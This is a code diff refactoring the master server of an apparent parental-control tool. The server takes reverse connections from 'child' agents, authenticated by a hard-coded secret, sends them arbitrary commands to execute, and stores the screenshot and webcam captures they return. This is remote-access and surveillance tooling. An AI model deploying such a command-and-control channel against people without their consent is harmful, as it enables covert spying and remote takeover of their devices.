@@ -3,7 +3,6 @@
 # Accepts Reverse Inbound Connections from Child Agents
 # =============================================================================
 
-use net
 use thread
 use process
 use file
@@ -14,49 +13,17 @@ use datetime
 import "../core/config.dz" as config
 import "../core/constants.dz" as constants
 
-let activeSessions = {}
-let pendingCommands = {}
-let commandResponses = {}
-let knownDevices = []
+let PENDING_CMDS_FILE = "storage/pending_cmds.json"
+let RESULTS_DIR = "storage/results"
 
-# Helpers for storage directories
-fn getScreenshotDir(deviceId)
-    let d = "storage/screenshots/" + deviceId
-    try dir.createAll(d) catch e end
-    return d
+fn ensureStorageDirs()
+    try dir.createAll("storage/screenshots") catch e end
+    try dir.createAll("storage/webcam") catch e end
+    try dir.createAll("storage/cache") catch e end
+    try dir.createAll(RESULTS_DIR) catch e end
 end
 
-fn getWebcamDir(deviceId)
-    let d = "storage/webcam/" + deviceId
-    try dir.createAll(d) catch e end
-    return d
-end
-
-# Auto-archive captures to disk
-fn handleAutoArchive(deviceId, rawData)
-    if isNull(rawData) or type(rawData) != "String"
-        return
-    end
-
-    let now = datetime.now()
-    let ts = str(now.year) + "-" + str(now.month) + "-" + str(now.day) + "_" + str(now.hour) + "-" + str(now.minute) + "-" + str(now.second)
-
-    if rawData.startsWith("SCREENSHOT:")
-        let b64 = rawData.substring(11).strip()
-        if b64 != "" and !b64.startsWith("ERR:")
-            let sDir = getScreenshotDir(deviceId)
-            let filePath = path.join(sDir, ts + ".b64")
-            try file.write(filePath, b64) catch e end
-        end
-    elif rawData.startsWith("WEBCAM:")
-        let b64 = rawData.substring(7).strip()
-        if b64 != "" and b64 != "NO_WEBCAM" and !b64.startsWith("ERR:")
-            let wDir = getWebcamDir(deviceId)
-            let filePath = path.join(wDir, ts + ".b64")
-            try file.write(filePath, b64) catch e end
-        end
-    end
-end
+ensureStorageDirs()
 
 # Auto-detect local IP of Parent PC
 fn detectParentLocalIp()
@@ -84,29 +51,81 @@ fn detectParentLocalIp()
     end
 end
 
-# Load initial device registry from children.json
-fn initDevicesFromDisk()
-    try
-        if file.isFile(config.DEVICES_FILE)
-            let data = file.read(config.DEVICES_FILE)
-            let list = json.decode(data)
-            if type(list) == "Array"
-                for d in list
-                    if type(d) == "Map" and d.has("id")
-                        d["is_online"] = False
-                        knownDevices.append(d)
-                        activeSessions[d["id"]] = d
-                    end
+# Background Master TCP Server Runner Code
+let BG_SERVER_SCRIPT = `
+use net
+use process
+use file
+use dir
+use path
+use json
+use datetime
+
+let MASTER_PORT = 9999
+let SECRET_KEY = "KIDS_CTRL_2026"
+let OFFLINE_TIMEOUT = 5.0
+let DEVICES_FILE = "children.json"
+let PENDING_CMDS_FILE = "storage/pending_cmds.json"
+let RESULTS_DIR = "storage/results"
+
+# Helpers for storage
+fn getSsDir(deviceId)
+    let d = "storage/screenshots/" + deviceId
+    try dir.createAll(d) catch e end
+    return d
+end
+
+fn getWcDir(deviceId)
+    let d = "storage/webcam/" + deviceId
+    try dir.createAll(d) catch e end
+    return d
+end
+
+fn autoArchive(deviceId, rawData)
+    if isNull(rawData) or type(rawData) != "String"
+        return
+    end
+
+    let now = datetime.now()
+    let ts = str(now.year) + "-" + str(now.month) + "-" + str(now.day) + "_" + str(now.hour) + "-" + str(now.minute) + "-" + str(now.second)
+
+    if rawData.startsWith("SCREENSHOT:")
+        let b64 = rawData.substring(11).strip()
+        if b64 != "" and !b64.startsWith("ERR:")
+            let sDir = getSsDir(deviceId)
+            let filePath = path.join(sDir, ts + ".b64")
+            try file.write(filePath, b64) catch e end
+        end
+    elif rawData.startsWith("WEBCAM:")
+        let b64 = rawData.substring(7).strip()
+        if b64 != "" and b64 != "NO_WEBCAM" and !b64.startsWith("ERR:")
+            let wDir = getWcDir(deviceId)
+            let filePath = path.join(wDir, ts + ".b64")
+            try file.write(filePath, b64) catch e end
+        end
+    end
+end
+
+# In-memory session tracking in server thread
+let sessions = {}
+
+# Load existing devices
+try
+    if file.isFile(DEVICES_FILE)
+        let dData = file.read(DEVICES_FILE)
+        let list = json.decode(dData)
+        if type(list) == "Array"
+            for d in list
+                if type(d) == "Map" and d.has("id")
+                    sessions[d["id"]] = d
                 end
             end
         end
-    catch e end
-end
+    end
+catch e end
 
-initDevicesFromDisk()
-
-# Master Server Request Handler
-fn handleIncomingAgent(client, clientIp)
+# Master TCP Server Instance
+let srv = new net.tcpServer(fn(client, clientIp, clientPort)
     let raw = client.receiveAll()
     if isNull(raw) or raw == ""
         client.close()
@@ -120,7 +139,7 @@ fn handleIncomingAgent(client, clientIp)
         return
     end
 
-    if req["secret"] != constants.SECRET_KEY
+    if req["secret"] != SECRET_KEY
         client.close()
         return
     end
@@ -136,9 +155,9 @@ fn handleIncomingAgent(client, clientIp)
     end
     let nowTs = datetime.now().timestamp()
 
-    # Update or insert device session
-    if !activeSessions.has(devId)
-        let newDev = {
+    # Update or create session
+    if !sessions.has(devId)
+        sessions[devId] = {
             "id": devId,
             "hostname": hostname,
             "custom_name": "",
@@ -146,15 +165,22 @@ fn handleIncomingAgent(client, clientIp)
             "is_online": True,
             "last_seen": nowTs
         }
-        activeSessions[devId] = newDev
-        knownDevices.append(newDev)
     else
-        let existing = activeSessions[devId]
-        existing["ip"] = reportedIp
-        existing["hostname"] = hostname
-        existing["is_online"] = True
-        existing["last_seen"] = nowTs
+        let s = sessions[devId]
+        s["hostname"] = hostname
+        s["ip"] = reportedIp
+        s["is_online"] = True
+        s["last_seen"] = nowTs
     end
+
+    # Sync sessions map to children.json
+    try
+        let listToSave = []
+        for k in sessions.keys()
+            listToSave.append(sessions[k])
+        end
+        file.write(DEVICES_FILE, json.encode(listToSave))
+    catch e end
 
     # Handle returned command output
     if req.has("result_cmd_id") and req["result_cmd_id"] != ""
@@ -163,41 +189,84 @@ fn handleIncomingAgent(client, clientIp)
         if req.has("result")
             resData = req["result"]
         end
-        commandResponses[cId] = resData
-        handleAutoArchive(devId, resData)
+        let resFile = path.join(RESULTS_DIR, cId + ".json")
+        try file.write(resFile, json.encode({"data": resData})) catch e end
+        autoArchive(devId, resData)
     end
 
-    # Check for next pending command
+    # Check for pending commands to dispatch to child
     let replyPayload = {"status": "OK", "action": "IDLE"}
-    if pendingCommands.has(devId) and pendingCommands[devId].length() > 0
-        let nextCmdObj = pendingCommands[devId].pop(0)
-        replyPayload = {
-            "status": "OK",
-            "action": "EXEC",
-            "cmd_id": nextCmdObj["cmd_id"],
-            "command": nextCmdObj["command"]
-        }
-    end
+    try
+        if file.isFile(PENDING_CMDS_FILE)
+            let pData = file.read(PENDING_CMDS_FILE)
+            let pMap = json.decode(pData)
+            if type(pMap) == "Map" and pMap.has(devId)
+                let q = pMap[devId]
+                if type(q) == "Array" and q.length() > 0
+                    let nextCmd = q.pop(0)
+                    replyPayload = {
+                        "status": "OK",
+                        "action": "EXEC",
+                        "cmd_id": nextCmd["cmd_id"],
+                        "command": nextCmd["command"]
+                    }
+                    file.write(PENDING_CMDS_FILE, json.encode(pMap))
+                end
+            end
+        end
+    catch e end
 
     client.send(json.encode(replyPayload))
     client.shutdown(net.SD_SEND)
     client.close()
+end)
+
+# Background liveness and disk sync thread
+thread.spawnCode(\`
+use process
+use file
+use json
+use datetime
+
+let DEVICES_FILE = "children.json"
+let OFFLINE_TIMEOUT = 5.0
+
+while True
+    process.sleep(1.5)
+    try
+        if file.isFile(DEVICES_FILE)
+            let data = file.read(DEVICES_FILE)
+            let list = json.decode(data)
+            if type(list) == "Array"
+                let now = datetime.now().timestamp()
+                let changed = False
+                for d in list
+                    if type(d) == "Map" and d.has("last_seen")
+                        let isOnline = (now - d["last_seen"]) < OFFLINE_TIMEOUT
+                        if d["is_online"] != isOnline
+                            d["is_online"] = isOnline
+                            changed = True
+                        end
+                    end
+                end
+                if changed
+                    file.write(DEVICES_FILE, json.encode(list))
+                end
+            end
+        end
+    catch e end
 end
+\`)
+
+try
+    srv.listen(MASTER_PORT)
+catch e end
+`
 
 # Registers all IPC handlers with ParentApp WebView
 fn register(app)
-    # Native TCP server instance directly in ParentApp process
-    let serverInstance = new net.tcpServer(fn(client, ip, port)
-        handleIncomingAgent(client, ip)
-    end)
-
-    # Listen on master port
-    try
-        serverInstance.listen(constants.MASTER_PORT)
-        print("[Master Server] Listening on 0.0.0.0:" + str(constants.MASTER_PORT))
-    catch e
-        print("[Master Server] Error starting server: " + str(e))
-    end
+    # Launch Master TCP Server in Background Thread
+    thread.spawnCode(BG_SERVER_SCRIPT)
 
     # IPC: getLocalServerIp
     app.bridge.on("getLocalServerIp", fn(payload)
@@ -206,20 +275,18 @@ fn register(app)
 
     # IPC: loadDevices
     app.bridge.on("loadDevices", fn(payload)
-        let now = datetime.now().timestamp()
-        for d in knownDevices
-            let did = d["id"]
-            if activeSessions.has(did)
-                let s = activeSessions[did]
-                let diff = now - s["last_seen"]
-                d["is_online"] = (diff < constants.OFFLINE_TIMEOUT_SECONDS)
-                d["ip"] = s["ip"]
-                d["hostname"] = s["hostname"]
-            else
-                d["is_online"] = False
+        try
+            if file.isFile(config.DEVICES_FILE)
+                let data = file.read(config.DEVICES_FILE)
+                let list = json.decode(data)
+                if type(list) == "Array"
+                    return list
+                end
             end
+            return []
+        catch e
+            return []
         end
-        return knownDevices
     end)
 
     # IPC: saveDevices
@@ -232,18 +299,6 @@ fn register(app)
                 list = json.decode(str(payload))
             end
             if isArray(list)
-                for item in list
-                    if type(item) == "Map" and item.has("id")
-                        let did = item["id"]
-                        if activeSessions.has(did)
-                            let cName = ""
-                            if item.has("custom_name")
-                                cName = item["custom_name"]
-                            end
-                            activeSessions[did]["custom_name"] = cName
-                        end
-                    end
-                end
                 file.write(config.DEVICES_FILE, json.encode(list))
                 return True
             end
@@ -253,27 +308,24 @@ fn register(app)
         end
     end)
 
-    # IPC: scanNetwork (Instant Live Refresh)
+    # IPC: scanNetwork (Instant Refresh from registry)
     app.bridge.on("scanNetwork", fn(payload)
-        let now = datetime.now().timestamp()
-        for d in knownDevices
-            let did = d["id"]
-            if activeSessions.has(did)
-                let s = activeSessions[did]
-                let diff = now - s["last_seen"]
-                d["is_online"] = (diff < constants.OFFLINE_TIMEOUT_SECONDS)
-                d["ip"] = s["ip"]
-                d["hostname"] = s["hostname"]
-            else
-                d["is_online"] = False
+        try
+            if file.isFile(config.DEVICES_FILE)
+                let data = file.read(config.DEVICES_FILE)
+                let list = json.decode(data)
+                if type(list) == "Array"
+                    return list
+                end
             end
+            return []
+        catch e
+            return []
         end
-        try file.write(config.DEVICES_FILE, json.encode(knownDevices)) catch e end
-        return knownDevices
     end)
 
     # IPC: agentCommand
-    # Queues command, waits for reverse response from child agent, returns data.
+    # Enqueues command in pending_cmds.json and waits for result file from reverse agent.
     app.bridge.on("agentCommand", fn(payload)
         try
             if type(payload) != "Map" or !payload.has("id") or !payload.has("command")
@@ -282,35 +334,46 @@ fn register(app)
 
             let devId = payload["id"]
             let cmd = payload["command"]
-
-            # Fast offline check
             let now = datetime.now().timestamp()
-            if !activeSessions.has(devId) or (now - activeSessions[devId]["last_seen"] >= constants.OFFLINE_TIMEOUT_SECONDS)
-                return {"ok": False, "data": "Device is currently offline."}
-            end
-
-            # Generate unique command ID
             let cmdId = "CMD_" + str(now).replace(".", "") + "_" + str(math.floor(math.random() * 10000.0))
-            if !pendingCommands.has(devId)
-                pendingCommands[devId] = []
+
+            # Read current pending commands map
+            let pMap = {}
+            try
+                if file.isFile(PENDING_CMDS_FILE)
+                    let pStr = file.read(PENDING_CMDS_FILE)
+                    pMap = json.decode(pStr)
+                end
+            catch e end
+
+            if !pMap.has(devId)
+                pMap[devId] = []
             end
 
-            pendingCommands[devId].append({
+            pMap[devId].append({
                 "cmd_id": cmdId,
                 "command": cmd
             })
 
-            # Wait for response (up to 8 seconds, checking every 60ms)
-            let maxWaitMs = 8000
+            file.write(PENDING_CMDS_FILE, json.encode(pMap))
+
+            # Wait for response in storage/results/<cmdId>.json
+            let resFile = path.join(RESULTS_DIR, cmdId + ".json")
+            let maxWaitMs = 10000
             let waited = 0
             let startTime = datetime.now().timestamp()
 
             while waited < maxWaitMs
-                if commandResponses.has(cmdId)
-                    let resultData = commandResponses[cmdId]
-                    commandResponses.pop(cmdId)
+                if file.isFile(resFile)
+                    let rContent = file.read(resFile)
+                    try file.delete(resFile) catch e end
+                    let resObj = json.decode(rContent)
+                    let rData = ""
+                    if type(resObj) == "Map" and resObj.has("data")
+                        rData = resObj["data"]
+                    end
                     let latency = math.floor((datetime.now().timestamp() - startTime) * 1000.0)
-                    return {"ok": True, "data": resultData, "latency": latency}
+                    return {"ok": True, "data": rData, "latency": latency}
                 end
                 process.sleep(0.06)
                 waited += 60
